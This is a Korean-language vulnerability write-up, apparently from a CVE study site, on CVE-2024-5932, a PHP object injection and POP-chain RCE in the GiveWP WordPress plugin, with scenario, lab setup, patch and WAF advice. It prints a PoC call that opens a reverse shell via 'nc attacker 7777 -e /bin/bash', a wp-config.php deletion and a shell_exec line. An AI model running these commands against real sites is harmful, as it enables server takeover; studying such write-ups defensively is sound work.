# 취약점 개요

import {
  Table,
  TableHeader,
  TableBody,
  TableRow,
  TableHead,
  TableCell,
} from "@/components/ui/table"

## 📋 설명

**GiveWP**는 전 세계 10만 개 이상의 WordPress 기반 기부·모금 사이트에서 사용되는 플러그인입니다.

2024년 8월, GiveWP 3.14.1 이전 버전에서 **PHP Object Injection**을 유발하는 심각한 취약점이 공개되었습니다.

(PHP 직렬화 데이터 검증 부족 → 악성 객체 역직렬화 가능)

이 취약점을 악용하면 공격자는 **POP Chain(Property Oriented Programming)**을 이용해:

- 임의 파일 삭제
- 임의 명령 실행(RCE)
- WordPress 완전 장악

까지 가능합니다.

## ⚠️ 왜 위험한가?

**낮은 공격 난이도**: 인증 불필요, 단순 HTTP 요청만으로 공격 가능

**광범위한 영향**: 전 세계 10만 개 이상의 WordPress 기반 사이트가 잠재적 위험에 노출

**완전한 시스템 장악**: WordPress 완전 장악, 임의 파일 삭제, OS 명령 실행 가능

**POP Chain 활용**: 작은 매직 메서드 결합으로도 강력한 RCE 가능

**실제 공격 사례**: 암호화폐 채굴기 설치, 시스템 파일 삭제, WordPress 초기화 후 계정 탈취 등 치명적 효과

---

## 취약점 정보

<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead className="text-white">항목</TableHead>
        <TableHead className="text-white">내용</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell className="text-white">CVSS 점수</TableCell>
        <TableCell className="text-white">9.8 (Critical)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">취약점 유형</TableCell>
        <TableCell className="text-white">PHP Object Injection + POP Chain 기반 RCE</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">영향 버전</TableCell>
        <TableCell className="text-white">GiveWP Plugin 3.14.1 이전 버전 전체</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">공격 난이도</TableCell>
        <TableCell className="text-white">Low (인증 불필요)</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">공개일</TableCell>
        <TableCell className="text-white">2024년 8월</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">영향 범위</TableCell>
        <TableCell className="text-white">전 세계 10만 개 이상의 WordPress 기반 기부·모금 사이트</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>

## 핵심 원인: 필터링 되지 않는 직렬화 입력 + 자동 역직렬화

GiveWP는 기부 폼 처리 과정에서 다음 두 가지 문제로 인해 취약해집니다:

### ✔ 1) 입력값 중 일부 파라미터가 직렬화 데이터 검증에서 제외됨

예: `give_title`

→ 악성 직렬화 데이터를 그대로 DB에 저장

### ✔ 2) 이후 동작 과정에서 `maybe_unserialize()`가 자동 호출됨

→ 저장된 값이 PHP 객체로 역직렬화됨

### ✔ 3) 역직렬화된 객체의 매직 메서드(`__destruct`, `__wakeup`, `__call`)가 자동 실행

→ 공격자가 의도한 POP Chain 동작

이 두 가지가 결합해 강력한 RCE로 이어지는 구조입니다.

---

# 공격 시나리오

**Step 1. GiveWP 플러그인 사용 사이트 탐색**

공격자가 GiveWP 플러그인을 사용하는 WordPress 사이트 탐색

**Step 2. 악성 직렬화 데이터 포함 HTTP 요청 전송**

`give_title` 등 특정 파라미터에 악성 직렬화 데이터 포함

**Step 3. 서버는 필터링되지 않은 값을 DB에 저장 후 역직렬화**

GiveWP는 필터링되지 않은 값을 DB에 저장하고, 이후 `maybe_unserialize()`가 자동 호출됨

**Step 4. POP Chain을 통해 RCE 또는 파일 삭제**

역직렬화된 객체의 매직 메서드가 자동 실행되어 POP Chain 동작

**결과:** 암호화폐 채굴기 설치, 시스템 파일 삭제, WordPress 초기화 후 계정 탈취 등 치명적 효과

---

# 실습 환경 구성

<div className="dark-table">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead className="text-white">역할</TableHead>
        <TableHead className="text-white">구성</TableHead>
        <TableHead className="text-white">IP</TableHead>
      </TableRow>
    </TableHeader>
    <TableBody>
      <TableRow>
        <TableCell className="text-white">피해자</TableCell>
        <TableCell className="text-white">WordPress 6.3.2 + GiveWP 3.14.1 (취약 버전)</TableCell>
        <TableCell className="text-white">-</TableCell>
      </TableRow>
      <TableRow>
        <TableCell className="text-white">공격자</TableCell>
        <TableCell className="text-white">Kali Linux</TableCell>
        <TableCell className="text-white">-</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>

## 사전 준비사항

- WordPress 환경
- GiveWP 취약 버전 설치
- Python PoC 스크립트
- 기본적인 PHP 직렬화 이해
- POP Chain 개념 이해

---

# 취약점 상세 분석

## 1) WordPress AJAX 기반 구조 활용

`admin-ajax.php`는 로그인 여부와 관계없이 특정 action을 호출 가능합니다.

```php
action = give_process_donation
→ wp_ajax_nopriv_give_process_donation
→ give_process_donation_form()
```

즉, 비로그인 사용자가 기부 요청 로직을 직접 호출 가능합니다.

## 2) 직렬화 검증 함수가 특정 파라미터만 검사

`give_donation_form_has_serialized_fields()`는 일부 파라미터만 검사하고, `give_title` 같은 파라미터는 제외합니다.

이로 인해 아래와 같은 악성 직렬화 데이터가 저장될 수 있습니다:

```
O:5:"TCPDF":2:{...}
```

## 3) DB에 저장 후 역직렬화(maybe_unserialize) 자동 호출

```php
$value = maybe_unserialize( $db_value );
```

GiveWP는 DB 메타 값 접근 시 자동으로 역직렬화 → 매직 메서드 호출 흐름으로 이어집니다.

## 🔥 공격 기법 상세 (PHP OI + POP Chain)

### ① PHP Object Injection

PHP의 매직 메서드는 역직렬화 시 자동 실행됩니다:

<div className="dark-table mt-8">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead className="text-white">매직 메서드</TableHead>
        <TableHead className="text-white">역할</TableHead>
      </TableRow>
    </TableHeader>

    <TableBody>
      <TableRow>
        <TableCell className="text-white">__wakeup</TableCell>
        <TableCell className="text-white">역직렬화 직후</TableCell>
      </TableRow>

      <TableRow>
        <TableCell className="text-white">__destruct</TableCell>
        <TableCell className="text-white">객체 소멸 시 자동 호출</TableCell>
      </TableRow>

      <TableRow>
        <TableCell className="text-white">__call</TableCell>
        <TableCell className="text-white">존재하지 않는 메서드 호출 시 동작</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>




공격자는 이 메커니즘을 악용하여 시스템 호출을 트리거할 수 있습니다.

### ② POP Chain 구성

GiveWP 내부에 존재하는 다음 클래스들을 연결해 POP Chain을 구성합니다:

- `Stripe\StripeObject`
- `GiveInsertPaymentData`
- `Give\Vendors\Faker\ValidGenerator`
- `Give\Onboarding\SettingsRepository`

**최종 목표:**

```php
call_user_func("shell_exec", <사용자 지정 명령>)
```

즉, WordPress 웹서버 OS 수준 명령 실행.

## 💣 공격 예시

### Reverse Shell 명령 실행

```bash
python3 CVE-2024-5932-rce.py \
  -u http://victim/2024/09/03/cve-2024-5932/ \
  -c "nc attacker 7777 -e /bin/bash"
```

→ 피해자 서버가 공격자에게 reverse shell 연결

→ WordPress 서버 완전 장악

## ⚡ 실제 공격 가능 사례

### 1) wp-config.php 삭제 → WordPress 재설치 모드 진입

TCPDF 클래스의 `__destroy()`가 파일 삭제를 유발:

```php
unlink('/var/www/html/wp-config.php');
```

**결과:**

✓ 홈페이지 초기 설치 화면 → 관리자 계정 탈취 가능

### 2) shell_exec 기반 임의 명령 실행

POP Chain 끝에서 다음 코드 실행:

```php
call_user_func("shell_exec", "touch /tmp/EQSTtest");
```

→ OS 명령 실행 성공

→ 웹쉘 생성 / 백도어 설치 가능

---

# 패치 정보

## 안전한 버전

- **GiveWP 3.14.2 이상**

## 패치 내용

- 직렬화 검증 대상 파라미터 확대
- `give_title` 포함 다양한 필드를 검증하도록 수정
- DB 저장 가능 경로 차단

## 즉시 업그레이드

취약 버전: 3.14.1 이하

패치 버전: 3.14.2

## WAF 룰 적용

아래 문자열 포함 요청 차단:

- `O:` (PHP 직렬화 객체)
- `a:{` (배열 직렬화 패턴)
- `__destruct`
- `__wakeup`

## WordPress 보안 정책

- 플러그인 자동 업데이트 활성화
- `admin-ajax.php` 외부 접근을 WAF 뒤로 이동
- 메타데이터 직렬화 사용 최소화

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 PHP 직렬화는 매우 위험

필터링되지 않을 경우 즉시 취약점으로 이어짐.

## 🔹 POP Chain은 작은 매직 메서드 결합으로도 강력한 RCE 가능

WordPress 같은 대형 생태계에서는 특히 주의 필요.

## 🔹 필터링 우회(\ → \\ , null byte → \0)도 항상 고려해야 함

보고서에서 확인된 패턴.

## 🔹 플러그인은 업데이트가 곧 보안

GitHub의 악성 리포지토리 사례도 있었음.

<div className="dark-table mt-8">
  <Table>
    <TableHeader>
      <TableRow>
        <TableHead className="text-white">항목</TableHead>
        <TableHead className="text-white">내용</TableHead>
      </TableRow>
    </TableHeader>

    <TableBody>
      <TableRow>
        <TableCell className="text-white">취약점 유형</TableCell>
        <TableCell className="text-white">PHP Object Injection</TableCell>
      </TableRow>

      <TableRow>
        <TableCell className="text-white">핵심 원인</TableCell>
        <TableCell className="text-white">매직 메서드가 역직렬화 과정에서 자동 실행</TableCell>
      </TableRow>

      <TableRow>
        <TableCell className="text-white">취약 함수</TableCell>
        <TableCell className="text-white">unserialize()</TableCell>
      </TableRow>

      <TableRow>
        <TableCell className="text-white">영향</TableCell>
        <TableCell className="text-white">원격 코드 실행, 임의 파일 포함, 데이터 조작</TableCell>
      </TableRow>

      <TableRow>
        <TableCell className="text-white">공격 난이도</TableCell>
        <TableCell className="text-white">중간 (payload 제작 필요)</TableCell>
      </TableRow>
    </TableBody>
  </Table>
</div>



---

# 참고 자료

- [Wordfence Advisory](https://www.wordfence.com/blog/2024/08/critical-vulnerability-in-givewp-plugin/)

- [EQSTLab PoC Repository](https://github.com/EQSTLab/CVE-2024-5932)

- [OWASP PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

- [WordPress add_action() Docs](https://developer.wordpress.org/reference/functions/add_action/)

